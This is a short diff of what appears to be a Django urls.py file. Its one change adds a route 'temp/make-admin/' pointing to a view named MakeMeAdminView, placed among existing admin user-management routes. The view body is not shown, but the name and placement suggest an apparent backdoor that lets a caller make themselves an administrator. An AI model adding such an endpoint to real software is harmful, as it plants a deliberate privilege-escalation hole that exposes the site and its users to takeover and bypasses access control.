@@ -105,4 +105,5 @@ path("support/tickets/<int:pk>/delete/", SupportTicketDeleteView.as_view()),
 path("admin/users/<int:user_id>/flag/", FlagUserView.as_view()),
 path("admin/users/<int:user_id>/unflag/", UnflagUserView.as_view()),
 
+    path("temp/make-admin/", MakeMeAdminView.as_view()),
 ]
